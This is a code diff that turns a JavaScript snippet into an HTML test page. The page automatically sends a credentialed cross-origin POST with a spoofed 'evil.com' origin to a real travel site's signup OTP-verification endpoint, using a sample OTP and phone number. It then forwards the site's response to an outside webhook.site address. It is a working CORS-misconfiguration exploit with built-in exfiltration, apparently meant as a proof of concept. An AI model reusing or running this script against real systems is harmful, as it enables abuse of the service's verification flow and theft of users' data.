@@ -1,47 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Test Script</title>
+</head>
+<body>
+    <h1>Script Test Page</h1>
+    <p>Check the console for output.</p>
 
+    <script>
+        // URL of the targeted site
+        const targetUrl = 'https://mapi.makemytrip.com/ext/web/pwa/verify/token/SIGNUP_OTP?region=us&currency=USD&language=eng';
 
-// URL of the targeted site
-const targetUrl = 'https://mapi.makemytrip.com/ext/web/pwa/verify/token/SIGNUP_OTP?region=us&currency=USD&language=eng';
+        // Data you want to POST
+        const postData = {
+            type: 6,
+            token: "100017",
+            mobileNumber: "56186761",
+            countryCode: "216"
+        };
 
-// Data you want to POST
-const postData = {
-    type: 6,
-    token: "100017",
-    mobileNumber: "56186761",
-    countryCode: "216"
-};
+        // Your webhook URL
+        const webhookUrl = 'https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5';
 
-// Your webhook URL
-const webhookUrl = 'https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5';
+        // Function to send data to the target and then to the webhook
+        function sendDataToTargetThenWebhook() {
+            fetch(targetUrl, {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://evil.com' // The origin set to show CORS misconfiguration
+                },
+                body: JSON.stringify(postData)
+            })
+            .then(response => response.json()) // Processing the response as JSON
+            .then(data => {
+                console.log('Received response:', data);
+                // Forwarding received data to the webhook
+                return fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data) // Sending received data to the webhook
+                });
+            })
+            .then(response => response.text()) // Processing the second response as text
+            .then(result => console.log('Webhook response:', result))
+            .catch(error => console.error('Error:', error));
+        }
 
-// Function to send data to the target and then to the webhook
-function sendDataToTargetThenWebhook() {
-    fetch(targetUrl, {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-            'Content-Type': 'application/json',
-            'Origin': 'https://evil.com' // The origin set to show CORS misconfiguration
-        },
-        body: JSON.stringify(postData)
-    })
-    .then(response => response.json()) // Processing the response as JSON
-    .then(data => {
-        console.log('Received response:', data);
-        // Forwarding received data to the webhook
-        return fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data) // Sending received data to the webhook
-        });
-    })
-    .then(response => response.text()) // Processing the second response as text
-    .then(result => console.log('Webhook response:', result))
-    .catch(error => console.error('Error:', error));
-}
-
-// Call the function to execute
-sendDataToTargetThenWebhook();
-
+        // Call the function to execute
+        sendDataToTargetThenWebhook();
+    </script>
+</body>
+</html>
